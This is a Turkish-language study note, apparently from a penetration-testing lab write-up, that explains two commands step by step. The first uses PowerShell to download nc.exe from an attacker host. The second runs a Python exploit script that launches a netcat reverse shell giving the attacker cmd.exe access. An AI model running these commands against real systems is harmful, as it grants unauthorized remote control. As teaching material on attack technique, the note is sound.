---
{"dg-publish":true,"permalink":"/baglantilar/komutun-ayrintisi-1/"}
---


1. Netcat'i İndirme Komutu

![Pasted image 20241218145825.png](/img/user/resimler/Pasted%20image%2020241218145825.png)

- **`powershell wget`**: PowerShell'de bir dosya indirmek için kullanılan `wget` komutu. Aslında, `Invoke-WebRequest`'in kısa hali.
- **`10.10.14.2/nc.exe`**:
    - `10.10.14.2` saldırganın IP adresi.
    - `nc.exe` dosyası Netcat programını temsil ediyor. Bu araç, ağ bağlantılarını dinleme ve ters bağlantı oluşturma gibi işlemler için kullanılır.
- **`-o`**: İndirilen dosyanın nereye kaydedileceğini belirtir.
- **`C:\xampp\htdocs\discuss\ups\nc.exe`**: Netcat dosyasının hedef sistemde bu dizine kaydedileceğini belirtir.

**Bu komut ne yapar?**

- Saldırgan makineden (`10.10.14.2`) `nc.exe` dosyasını indirir.
- Dosyayı hedef sistemin `C:\xampp\htdocs\discuss\ups\` klasörüne kaydeder.



2. Python Scripti ile Netcat'i Çalıştırma

`c:\python27\python.exe druva.py "windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc.exe 10.10.14.2 4444 -e cmd.exe"`

Bu komut iki parçadan oluşuyor:

#### **2.1 Python Scripti Çalıştırma**

- **`c:\python27\python.exe`**: Hedef sistemde Python 2.7 çalıştırıcıyı kullanır.
- **`druva.py`**: Bir Python scriptidir. Bu script bir komut çalıştırmak için kullanılıyor.
- **`"windows\system32\cmd.exe /C ..."`**:
    - `cmd.exe`: Windows komut istemcisini çalıştırır.
    - **`/C`**: Komut istemcisinin verilen komutu çalıştırdıktan sonra kapanmasını sağlar.

#### **2.2 Netcat ile Ters Bağlantı**

- **`C:\xampp\htdocs\discuss\ups\nc.exe`**: Daha önce indirdiğimiz Netcat programı çalıştırılır.
- **`10.10.14.2`**: Saldırganın IP adresi. Netcat, bu adrese bağlanacaktır.
- **`4444`**: Saldırgan tarafında dinlenen **port numarası**.
- **`-e cmd.exe`**: Netcat'e bağlandıktan sonra `cmd.exe`'yi çalıştırarak saldırgana **Windows komut satırı erişimi** sağlar.

---

### **Komutların Etkisi**

1. **İlk Komut**:
    - Netcat (`nc.exe`) dosyasını saldırgandan indirir ve hedef sistemde belirli bir klasöre kaydeder.
2. **İkinci Komut**:
    - Netcat'i çalıştırarak, hedef sistemden saldırganın IP'sine (10.10.14.2) **4444 portu** üzerinden bir bağlantı gönderir.
    - Bu bağlantı, saldırganın makinesinde dinleyen **Netcat** oturumuna bağlanır.
    - **`-e cmd.exe`** sayesinde saldırgan, hedef sistem üzerinde bir **komut satırı (cmd.exe)** oturumu elde eder.

---

### **Sonuç**

Bu komutların amacı:

- Hedef sistemde **Netcat** kullanarak saldırgana **ters bağlantı (reverse shell)** vermek.
- Saldırgan, hedef sistemde Windows komut satırını uzaktan kontrol edebilir.

**Özet Akış**:

1. Netcat dosyası indiriliyor.
2. Netcat çalıştırılarak saldırgana bağlantı gönderiliyor.
3. Saldırgan tarafında dinleyen Netcat oturumu, hedef sistemin `cmd.exe` komut satırına erişim sağlıyor.

Bu tür bir işlem, genellikle **penetration testing** veya **yetki yükseltme** aşamalarında kullanılır.



